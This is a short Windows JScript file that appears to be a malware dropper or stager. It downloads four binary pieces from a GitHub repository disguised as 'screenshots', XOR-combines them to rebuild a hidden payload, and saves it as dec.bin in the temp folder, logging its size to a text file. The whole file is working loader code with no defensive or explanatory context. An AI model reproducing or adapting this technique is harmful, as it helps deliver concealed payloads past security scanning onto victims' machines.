var x=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
var fso=new ActiveXObject("Scripting.FileSystemObject");
var b=[];for(var i=0;i<4;i++){x.Open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/c"+i,0);x.Send();b.push(x.ResponseBody);}
var xr=[];var l=b[0].length;for(var k=0;k<l;k++){var v=b[0][k];for(var j=1;j<4;j++){v^=b[j][k]};xr.push(v)}
var s=new ActiveXObject("ADODB.Stream");s.Type=1;s.Open();
for(var m=16;m<xr.length;m++)s.WriteByte(xr[m]&0xFF);
var t=fso.GetSpecialFolder(2)+"\\dec.bin";s.SaveToFile(t,2);s.Close();
fso.CreateTextFile("C:\\temp\\k4.txt").Write("OK "+xr.length+"b");
